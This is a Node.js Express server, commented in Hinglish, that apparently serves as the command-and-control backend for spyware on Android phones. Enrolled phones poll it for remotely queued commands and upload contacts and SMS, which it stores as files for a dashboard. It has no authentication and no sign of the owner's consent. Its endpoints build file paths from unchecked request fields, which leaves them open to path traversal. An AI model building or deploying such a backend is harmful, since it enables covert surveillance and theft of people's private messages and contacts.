const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// 1. CORS & JSON Setup
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// 2. Data Directory Setup
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

let deviceState = {}; 

// 3. API: Dashboard Status (Har 3 sec mein dashboard ise call karta hai)
app.get('/api/device-status/:deviceId', (req, res) => {
    const state = deviceState[req.params.deviceId] || { isOnline: false };
    const isOnline = state.lastSeen ? (Date.now() - state.lastSeen) < 30000 : false;
    res.json({ ...state, isOnline });
});

// 4. API: Send Command (Jab aap dashboard par button dabate ho)
app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (!deviceState[device_id]) deviceState[device_id] = {};
    
    deviceState[device_id].currentCommand = command;
    console.log(`🚀 [COMMAND] New command set for ${device_id}: ${command}`);
    res.json({ status: "success", message: "Command queued" });
});

// 5. API: Phone Status Update (Phone har waqt ise call karta hai)
app.post('/api/update-status', (req, res) => {
    const { device_id, model, android_version, battery, ringerMode } = req.body;
    
    if (!device_id) return res.status(400).send("No Device ID");

    // Phone ka status update karein
    deviceState[device_id] = {
        ...deviceState[device_id], // Purani commands save rakhega
        model: model || "Android Device",
        android_version: android_version || "--",
        battery: battery || 0,
        ringerMode: ringerMode || "normal",
        lastSeen: Date.now()
    };
    
    // Command check karein
    const cmd = deviceState[device_id].currentCommand || "none";
    
    // Agar koi real command hai (none nahi hai), toh phone ko bhej kar reset karein
    if (cmd !== "none") {
        console.log(`📡 [DISPATCH] Phone ${device_id} is picking up: ${cmd}`);
        deviceState[device_id].currentCommand = "none"; 
    }

    res.json({ command: cmd });
});

// 6. API: Data Upload (Jab phone contacts/sms bhejta hai)
app.post('/api/upload-data', (req, res) => {
    const { device_id, type, data } = req.body; 
    
    if (!device_id || !type || !data) {
        return res.status(400).send("Missing parameters");
    }

    const fileName = `${device_id}_${type}.json`;
    const filePath = path.join(DATA_DIR, fileName);
    
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
        console.log(`📂 [SAVED] ${type.toUpperCase()} data saved for ${device_id}`);
        res.status(200).send("Data saved successfully");
    } catch (err) {
        console.error("Save error:", err);
        res.status(500).send("Internal Server Error");
    }
});

// 7. API: Get Data (Dashboard view pages ke liye)
app.get('/api/get-data/:deviceId/:type', (req, res) => {
    const { deviceId, type } = req.params;
    const filePath = path.join(DATA_DIR, `${deviceId}_${type}.json`);
    
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        console.log(`⚠️ [NOT FOUND] File for ${type} not available yet`);
        res.json([]); // Khali array bhejo agar file nahi hai
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server is running on port ${PORT}`);
});
